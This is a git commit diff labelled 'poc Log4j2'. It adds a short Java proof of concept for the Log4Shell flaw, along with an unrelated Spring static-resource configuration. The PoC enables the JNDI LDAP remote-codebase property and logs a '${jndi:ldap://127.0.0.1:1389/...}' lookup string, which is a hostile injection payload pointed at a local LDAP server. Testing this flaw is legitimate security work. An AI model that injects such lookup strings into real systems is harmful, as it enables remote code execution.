8cc4c6db7271301c8debbb44dc2b102cb8026b4b
xiejuntao <xiejuntao@lizhi.fm>
2021-12-24 16:16:57 +0800

    poc Log4j2

---
+++ poc-log4j2/src/main/java/xjt/poc/Log4j2.java
@@ -0,0 +1,13 @@
+package xjt.poc;
+
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+public class Log4j2 {
+    private static final Logger logger = LogManager.getLogger(Log4j2.class);
+
+    public static void main(String[] args) {
+        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
+        logger.error("params:{}","${jndi:ldap://127.0.0.1:1389/Log4jTest}");
+    }
+}
---
+++ springboot/src/main/java/xjt/sb/config/WebConfig.java
@@ -0,0 +1,13 @@
+package xjt.sb.config;
+
+import org.springframework.context.annotation.Configuration;
+import org.springframework.web.servlet.config.annotation.ResourceHandlerRegistry;
+import org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;
+@Configuration
+public class WebConfig extends WebMvcConfigurerAdapter {
+    @Override
+    public void addResourceHandlers(ResourceHandlerRegistry registry) {
+        registry.addResourceHandler("/static/**")
+                .addResourceLocations("classpath:/static/");
+    }
+}
